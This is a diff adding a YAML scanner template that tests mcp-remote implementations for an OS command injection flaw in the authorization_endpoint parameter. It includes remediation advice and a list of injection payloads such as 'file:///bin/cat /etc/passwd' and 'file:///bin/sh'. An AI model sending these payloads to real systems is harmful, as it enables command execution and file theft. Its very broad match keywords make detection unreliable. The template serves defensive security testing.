@@ -1,0 +1,147 @@
+---
+id: MCP_REMOTE_COMMAND_INJECTION_RCE
+
+info:
+  name: "MCP: Remote Command Injection RCE (mcp-remote)"
+  description: >
+    Tests whether MCP remote implementations are vulnerable to OS command injection
+    when connecting to untrusted MCP servers. This test attempts to exploit the
+    authorization_endpoint URL parameter to execute arbitrary OS commands through
+    crafted input from malicious MCP servers.
+  details: >
+    Test idea:
+    - Send requests with malicious authorization_endpoint URLs designed to trigger
+      OS command injection in mcp-remote implementations
+    - Attempt to execute arbitrary OS commands through crafted file:// URLs and
+      system command injection patterns
+    - Test for command injection through authorization_endpoint response URLs
+      that can lead to remote code execution
+    - This template targets mcp-remote implementations and flags successful
+      command injection attempts through response analysis.
+  impact: >
+    Successful remote command injection can lead to:
+    - Complete system compromise and arbitrary code execution
+    - Remote code execution (RCE) with system privileges
+    - File system access and sensitive file reading
+    - Network reconnaissance and lateral movement
+    - Data exfiltration and system manipulation
+    - Privilege escalation and persistence mechanisms
+  remediation: |
+    To prevent remote command injection in mcp-remote:
+    
+    1. **Input Validation**: Implement strict input validation for authorization_endpoint URLs. Validate URL formats and reject suspicious patterns.
+    
+    2. **URL Sanitization**: Sanitize all authorization_endpoint URLs to remove or escape command injection patterns and special characters.
+    
+    3. **URL Allowlisting**: Use allowlists for authorization_endpoint URLs. Only permit predefined, safe URL patterns and reject any attempts to use malicious URLs.
+    
+    4. **Command Execution Prevention**: Avoid executing system commands with user input. Use safe alternatives like parameterized APIs or whitelisted command patterns.
+    
+    5. **Shell Escaping**: Properly escape all user input before using it in shell commands or system calls.
+    
+    6. **Least Privilege Execution**: Execute commands with minimal required privileges. Avoid using administrative accounts for command execution.
+    
+    7. **Command Isolation**: Implement proper isolation between command execution and other system operations.
+    
+    8. **Error Handling**: Implement secure error handling that doesn't reveal system information or command execution details.
+    
+    9. **Logging and Monitoring**: Log all command execution attempts and monitor for suspicious patterns.
+    
+    10. **Regular Security Testing**: Conduct regular security testing to identify and fix command injection vulnerabilities.
+  category:
+    name: MCP_SECURITY
+    shortName: MCP_SEC
+    displayName: Model Context Protocol (MCP) Security
+  subCategory: MCP_REMOTE_COMMAND_INJECTION_RCE
+  severity: CRITICAL
+  tags:
+    - mcp
+    - remote-command-injection
+    - rce
+    - authorization-endpoint
+    - llm-security
+  references:
+    - https://research.jfrog.com/vulnerabilities/mcp-remote-command-injection-rce-jfsa-2025-001290844/
+    - https://owasp.org/www-project-top-ten/2017/A1_2017-Injection
+    - https://cwe.mitre.org/data/definitions/78.html
+  cwe:
+    - CWE-78
+    - CWE-20
+    - CWE-74
+  cve:
+    - CVE-2025-6514
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+wordLists:
+  commandInjectionPayloads:
+    - "file:/c:/windows/system32/calc.exe"
+    - "file:///bin/sh"
+    - "file:///usr/bin/id"
+    - "file:///bin/cat /etc/passwd"
+    - "file:///usr/bin/whoami"
+    - "file:///bin/ls -la"
+    - "file:///usr/bin/env"
+    - "file:///bin/uname -a"
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: POST
+  request_payload:
+    contains_all:
+      - jsonrpc
+      - method
+      - params
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            params.authorization_endpoint: "${commandInjectionPayloads}"
+        - add_body_param:
+            params.auth_endpoint: "${commandInjectionPayloads}"
+        - add_body_param:
+            params.endpoint: "${commandInjectionPayloads}"
+        - add_body_param:
+            params.url: "${commandInjectionPayloads}"
+        - add_body_param:
+            params.authorization_url: "${commandInjectionPayloads}"
+validate:
+  response_payload:
+    contains_either:
+      - "calc.exe"
+      - "calculator"
+      - "id"
+      - "uid="
+      - "gid="
+      - "groups="
+      - "root"
+      - "admin"
+      - "user"
+      - "whoami"
+      - "Linux"
+      - "Darwin"
+      - "Windows"
+      - "localhost"
+      - "127.0.0.1"
+      - "bin"
+      - "sbin"
+      - "etc"
+      - "var"
+      - "usr"
+      - "home"
+      - "proc"
+      - "sys"
+      - "dev"
+      - "tmp"
+      - "opt"
+      - "lib"
+      - "boot"
+      - "mnt"
+      - "media"
+      - "srv"
+      - "run"
+      - "lost+found"
